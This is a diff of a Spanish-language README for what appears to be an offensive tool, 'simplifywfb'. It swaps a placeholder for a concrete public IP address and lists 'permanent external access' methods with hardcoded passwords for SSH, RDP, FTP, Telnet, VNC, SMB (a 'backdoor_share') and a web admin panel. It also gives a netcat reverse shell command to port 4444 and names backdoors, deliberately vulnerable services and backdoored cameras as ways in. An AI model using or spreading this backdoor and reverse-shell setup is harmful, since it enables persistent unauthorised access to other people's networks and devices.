@@ -472,27 +472,74 @@ El script genera un archivo `simplifywfb_report_TIMESTAMP.json` con todos los da
 
 ---
 
-## 🔑 MÉTODOS DE ACCESO REMOTO
+## 🔑 MÉTODOS DE ACCESO REMOTO EXTERNO
 
 ### **1. SSH (Terminal)** 💻
 ```bash
-ssh svc_ssh@TU_IP_PUBLICA -p 2222
+ssh svc_ssh@212.95.62.135 -p 2222
 # Contraseña: SSH_P@ssw0rd_2024!
 ```
 
-### **2. VPN (Conexión Segura)** 🔒
+### **2. RDP (Escritorio Remoto Windows)** 🖥️
+```bash
+# Linux/Mac
+xfreerdp /v:212.95.62.135:3389 /u:svc_rdp /p:RDP_P@ssw0rd_2024!
+
+# Windows
+mstsc /v:212.95.62.135:3389
+# Usuario: svc_rdp
+# Contraseña: RDP_P@ssw0rd_2024!
+```
+
+### **3. FTP (Transferencia de Archivos)** 📁
+```bash
+ftp 212.95.62.135 21
+# Usuario: svc_ftp
+# Contraseña: FTP_P@ssw0rd_2024!
+```
+
+### **4. Telnet (Terminal Remoto)** 📡
+```bash
+telnet 212.95.62.135 23
+# Usuario: svc_telnet
+# Contraseña: Telnet_P@ssw0rd_2024!
+```
+
+### **5. VNC (Escritorio Remoto Linux)** 🖼️
+```bash
+vncviewer 212.95.62.135:5900
+# Usuario: svc_vnc
+# Contraseña: VNC_P@ssw0rd_2024!
+```
+
+### **6. SMB (Archivos Windows)** 💾
+```bash
+# Linux
+smbclient //212.95.62.135/backdoor_share -U svc_smb%SMB_P@ssw0rd_2024!
+
+# Windows
+net use \\212.95.62.135\backdoor_share /user:svc_smb SMB_P@ssw0rd_2024!
+```
+
+### **7. VPN (Conexión Segura)** 🔒
 ```bash
 openvpn --config client.ovpn
 ```
 
-### **3. Panel Web** 🌐
+### **8. Panel Web** 🌐
 ```
-http://admin:Web_P@ssw0rd_2024!@TU_IP_PUBLICA:8080/admin
+http://admin:Web_P@ssw0rd_2024!@212.95.62.135:8080/admin
 ```
 
-### **4. Reverse Shell** 🔄
+### **9. HTTP/HTTPS Directo** 🌍
+```
+http://212.95.62.135:80
+https://212.95.62.135:443
+```
+
+### **10. Reverse Shell** 🔄
 ```bash
-nc -e /bin/bash TU_IP_PUBLICA 4444
+nc -e /bin/bash 212.95.62.135 4444
 ```
 
 ---
@@ -508,10 +555,16 @@ nc -e /bin/bash TU_IP_PUBLICA 4444
 - **Servicios vulnerables** (MongoDB, Redis, Docker, etc.)
 - **Múltiples formas** de acceder remotamente
 
-### **✅ ACCESO PERMANENTE:**
-- **SSH** para terminal remoto
-- **VPN** para conexión segura
-- **Panel web** para administración
+### **✅ ACCESO PERMANENTE EXTERNO:**
+- **SSH** para terminal remoto (puerto 2222)
+- **RDP** para escritorio remoto Windows (puerto 3389)
+- **FTP** para transferencia de archivos (puerto 21)
+- **Telnet** para terminal remoto (puerto 23)
+- **VNC** para escritorio remoto Linux (puerto 5900)
+- **SMB** para archivos Windows (puerto 445)
+- **VPN** para conexión segura (puerto 1194)
+- **Panel web** para administración (puerto 8080)
+- **HTTP/HTTPS** directo (puertos 80/443)
 - **Backdoors** para acceso oculto
 - **Servicios vulnerables** con backdoors específicos
 - **Cámaras con backdoors** y acceso remoto
